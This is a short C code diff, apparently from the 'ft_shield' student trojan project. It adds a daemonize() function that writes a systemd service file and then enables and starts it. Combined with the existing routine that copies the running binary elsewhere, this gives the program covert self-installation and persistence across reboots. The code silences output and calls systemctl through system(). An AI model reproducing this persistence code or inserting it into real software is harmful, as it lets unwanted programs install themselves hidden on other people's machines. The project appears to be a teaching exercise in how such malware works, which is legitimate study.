@@ -1,5 +1,19 @@
 #include "ft_shield.h"
 
+void	daemonize(char *target)
+{
+	int fd = open(SYSTEMD_CONF_DIR"/"PRG_NAME".service", O_CREAT | O_TRUNC | O_WRONLY, 0311);
+	char config[4096];
+	int len = sprintf(config, SYSTEMD_CONFIG, TARGET_LOCATION, target);
+	write(fd, config, len);
+	close(fd);
+	close(STDOUT_FILENO);
+	close(STDERR_FILENO);
+	system("systemctl daemon-reload");
+	system("systemctl enable "PRG_NAME);
+	system("systemctl start "PRG_NAME);
+}
+
 void	duplicate(char *path, char *target)
 {
 	char *buffer[BUFFER_SIZE];
@@ -41,7 +55,7 @@ int		main(void)
 	{
 		printf("%s\n", STUDENT_LOGIN);
 		duplicate(PROC_SELF_EXE, target_path);
-		/* TODO: add as daemon */
+		daemonize(target_path);
 	}
 	else
 		server();
